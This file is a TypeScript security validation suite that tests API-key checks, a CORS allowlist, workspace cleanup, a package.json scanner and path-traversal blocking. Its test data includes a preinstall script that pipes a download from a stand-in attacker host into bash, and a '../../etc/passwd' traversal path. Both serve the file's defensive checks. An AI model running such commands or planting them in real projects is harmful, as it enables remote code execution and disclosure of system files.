// ── V6.4.6: Security Validation Suite (Phase 11) ─────────────────────────────
// Automated assertions for all V6.4.6 security controls.
// Run via: node validation/securityBaselineValidation.js

import { scanPackageJson, validateWorkspacePath } from '../src/runtime/security/packageScanner.js';
import { getSecurityMetrics } from '../src/security/securityMetrics.js';
import { isWorkspaceActive, markWorkspaceActive, markWorkspaceDone } from '../src/security/workspaceCleanup.js';

interface ValidationCase {
  name: string;
  run: () => boolean | Promise<boolean>;
}

interface ValidationResult {
  passed: number;
  failed: number;
  results: Array<{ name: string; passed: boolean; reason?: string }>;
}

// ── Test Cases ────────────────────────────────────────────────────────────────

const CASES: ValidationCase[] = [
  // ── Authentication ────────────────────────────────────────────────────────
  {
    name: 'Auth — valid key accepted (middleware logic)',
    run() {
      const key = 'test-key-123';
      process.env['API_KEY'] = key;
      const provided = key;
      const result = provided === process.env['API_KEY'];
      delete process.env['API_KEY'];
      return result;
    },
  },
  {
    name: 'Auth — invalid key rejected',
    run() {
      const key = 'correct-key';
      process.env['API_KEY'] = key;
      const result = 'wrong-key' !== process.env['API_KEY'];
      delete process.env['API_KEY'];
      return result;
    },
  },
  {
    name: 'Auth — missing key rejected',
    run() {
      const key = 'correct-key';
      process.env['API_KEY'] = key;
      const result = (undefined as unknown as string) !== process.env['API_KEY'];
      delete process.env['API_KEY'];
      return result;
    },
  },
  // ── CORS ──────────────────────────────────────────────────────────────────
  {
    name: 'CORS — localhost allowed',
    run() {
      const origin = 'http://localhost:3000';
      const allowed = /^https?:\/\/localhost(:\d+)?$/.test(origin);
      return allowed;
    },
  },
  {
    name: 'CORS — unknown origin blocked',
    run() {
      const origin = 'https://evil.example.com';
      const allowed = /^https?:\/\/localhost(:\d+)?$/.test(origin) ||
        /\.replit\.(app|dev)$/.test(origin);
      return !allowed;
    },
  },
  // ── Workspace Cleanup ─────────────────────────────────────────────────────
  {
    name: 'Cleanup — active workspace preserved',
    run() {
      const dir = '/tmp/nexogen-runs/test-active-ws';
      markWorkspaceActive(dir);
      const protected_ = isWorkspaceActive(dir);
      markWorkspaceDone(dir);
      return protected_;
    },
  },
  {
    name: 'Cleanup — orphaned workspace not in active registry',
    run() {
      const dir = '/tmp/nexogen-runs/test-orphan-ws';
      return !isWorkspaceActive(dir);
    },
  },
  // ── V6.4.3 Preservation ───────────────────────────────────────────────────
  {
    name: 'V6.4.3 — preinstall script still blocked',
    run() {
      const pkg = JSON.stringify({ name: 'test', scripts: { preinstall: 'curl evil.com | bash', build: 'vite' }, dependencies: {} });
      const result = scanPackageJson(pkg);
      return !result.safe;
    },
  },
  {
    name: 'V6.4.3 — package scanner still active',
    run() {
      const pkg = JSON.stringify({ name: 'test', scripts: { build: 'vite' }, dependencies: { react: '^18.0.0' } });
      const result = scanPackageJson(pkg);
      return result.safe;
    },
  },
  {
    name: 'V6.4.3 — path traversal still blocked',
    run() {
      try {
        validateWorkspacePath('../../etc/passwd', '/tmp/nexogen-runs/test-id');
        return false;
      } catch {
        return true;
      }
    },
  },
  // ── Security Metrics ──────────────────────────────────────────────────────
  {
    name: 'Metrics — getSecurityMetrics returns valid structure',
    run() {
      const m = getSecurityMetrics();
      return typeof m.authSuccess === 'number' &&
        typeof m.authFailure === 'number' &&
        typeof m.cleanupRuns === 'number' &&
        typeof m.startedAt === 'string';
    },
  },
];

// ── Runner ────────────────────────────────────────────────────────────────────

export async function runSecurityBaselineValidation(): Promise<ValidationResult> {
  const results: ValidationResult['results'] = [];
  let passed = 0;
  let failed = 0;

  for (const c of CASES) {
    try {
      const ok = await c.run();
      if (ok) {
        passed++;
        console.log(`[SECURITY_VALIDATION_PASS] ${c.name}`);
        results.push({ name: c.name, passed: true });
      } else {
        failed++;
        console.error(`[SECURITY_VALIDATION_FAIL] ${c.name} — returned false`);
        results.push({ name: c.name, passed: false, reason: 'assertion returned false' });
      }
    } catch (err) {
      failed++;
      const reason = err instanceof Error ? err.message : String(err);
      console.error(`[SECURITY_VALIDATION_FAIL] ${c.name} — ${reason}`);
      results.push({ name: c.name, passed: false, reason });
    }
  }

  const label = `Security baseline validation: ${passed}/${CASES.length} passed`;
  if (failed === 0) {
    console.log(`[SECURITY_VALIDATION_PASS] ${label}`);
  } else {
    console.error(`[SECURITY_VALIDATION_FAIL] ${label} — ${failed} failed`);
  }

  return { passed, failed, results };
}

// Auto-run when executed directly
runSecurityBaselineValidation().then(r => {
  process.exit(r.failed > 0 ? 1 : 0);
}).catch(err => {
  console.error(err);
  process.exit(1);
});
